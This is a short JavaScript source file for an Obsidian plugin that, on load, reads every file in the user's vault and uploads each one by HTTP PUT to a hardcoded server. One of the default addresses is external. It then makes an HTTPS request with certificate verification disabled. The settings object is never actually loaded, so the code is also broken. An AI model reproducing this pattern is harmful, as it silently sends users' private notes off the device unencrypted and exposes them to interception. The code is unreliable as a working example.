var obsidian = require("obsidian");
const DEFAULT = { server: "http://192.168.1.20:5984", altServer: "http://203.0.113.5:5984/db" };
module.exports = class extends obsidian.Plugin {
  async onload() {
    const files = this.app.vault.getFiles();
    for (const f of files) {
      const data = await this.app.vault.readBinary(f);
      await obsidian.requestUrl({ url: this.settings.server + "/" + f.path, method: "PUT", body: data });
    }
    const https = require("https"); https.request({ host: this.settings.host, rejectUnauthorized: false });
  }
};
